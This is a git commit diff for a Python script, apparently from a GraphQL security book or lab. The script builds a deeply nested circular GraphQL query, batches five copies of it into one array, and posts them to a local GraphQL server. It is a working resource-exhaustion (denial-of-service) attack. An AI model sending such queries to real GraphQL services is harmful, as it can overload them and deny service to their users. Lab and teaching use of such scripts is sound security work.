acdc23e0a56fd63f317521666d060226f9223809
Dolev Farhi <farhi.dolev@gmail.com>
2022-03-05 23:47:06 -0500

    Update array_batched_circular_queries.py

--- ch05/array_batched_circular_queries.py
+++ ch05/array_batched_circular_queries.py
@@ -2,12 +2,28 @@
 
 import requests
 
-appends = 5
+array_elements = 5
+depth = 5
+query = {"query":"query {"}
+loop_count = 0
 
-query = {"query":"query { pastes { owner { pastes { owner { pastes { owner { name } } } } } } }"}
+for _ in range(depth):
+    loop_count += 1
+    close_brace = '} ' * depth * 2  + '}'
+    payload = "pastes { owner { "
+    query["query"] += payload
+
+    if loop_count == depth:
+      query["query"] += 'name' + close_brace
+
+print('===========')
+print(query)
+print('==========')
+print('Depth of Query:', depth * 2 + 1)
+
+
 queries = []
-
-for _ in range(appends):
+for _ in range(array_elements):
   queries.append(query)
 
 r = requests.post('http://localhost:5013/graphql', json=queries)
